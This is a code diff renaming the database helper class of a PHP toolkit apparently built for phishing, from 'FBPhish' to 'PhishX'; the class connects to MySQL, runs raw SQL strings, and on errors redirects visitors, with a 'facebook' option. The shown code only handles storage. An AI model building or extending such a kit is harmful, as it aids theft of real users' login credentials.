@@ -1,7 +1,7 @@
 <?php
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+PhishX
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -22,31 +22,31 @@ along with this program.  If not, see http://www.gnu.org/licenses/.
 require_once(__DIR__ . "/../config.inc.php");
 
 class sql{
-	protected $fbphish_database_conn;
-	protected $fbphish_database_conn_err;
+	protected $phishx_database_conn;
+	protected $phishx_database_conn_err;
 	protected $query_arg1;
 	protected $query;
 	protected $success;
 
 	public function db_connect() {
-		global $fbphish_sql_host;
-		global $fbphish_sql_db;
-		global $fbphish_sql_user;
-		global $fbphish_sql_password;
+		global $phishx_sql_host;
+		global $phishx_sql_db;
+		global $phishx_sql_user;
+		global $phishx_sql_password;
 		global $config_option__451;
-		global $fbphish_database_conn;
-		global $fbphish_database_conn_err;
+		global $phishx_database_conn;
+		global $phishx_database_conn_err;
 		global $success;
 
 		try{
 			// Connect
-		    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
+		    $phishx_database_conn = new PDO("mysql:host=$phishx_sql_host;dbname=$phishx_sql_db", $phishx_sql_user, $phishx_sql_password);
 		    // set the PDO error mode to exception
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-		    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
+		    $phishx_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+		    $phishx_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
 
 		    $success = "true";
-		}catch(PDOException $fbphish_database_conn_err){
+		}catch(PDOException $phishx_database_conn_err){
 			$success = "false";
 
 			// Error reporting
@@ -58,7 +58,7 @@ class sql{
 					header("Location: /index.php");
 					break;
 				case "show":
-					echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
+					echo "Connection failed: " . $phishx_database_conn_err->getMessage();
 					break;
 				default:
 					header("Location: $config_option__451");
@@ -68,16 +68,16 @@ class sql{
 
 	public function query($query_arg1){
 		global $config_option__451;
-		global $fbphish_database_conn;
-		global $fbphish_database_conn_err;
+		global $phishx_database_conn;
+		global $phishx_database_conn_err;
 		global $success;
 		if($success == "true"){
 			try{
 			// Set the sql query
 				$query = $query_arg1;
 				// Execute sql
-				$fbphish_database_conn->exec($query);
-			}catch(PDOException $fbphish_database_conn_err){
+				$phishx_database_conn->exec($query);
+			}catch(PDOException $phishx_database_conn_err){
 				// Error reporting
 				switch($config_option__451){
 					case "facebook":
@@ -87,7 +87,7 @@ class sql{
 						header("Location: /index.php");
 						break;
 					case "show":
-						echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
+						echo "Connection failed: " . $phishx_database_conn_err->getMessage();
 						break;
 					default:
 						header("Location: $config_option__451");
@@ -99,9 +99,9 @@ class sql{
 	}
 
 	public function db_close() {
-		global $fbphish_database_conn;
+		global $phishx_database_conn;
 
 		// Close connection
-		$fbphish_database_conn = null;
+		$phishx_database_conn = null;
 	}
 }
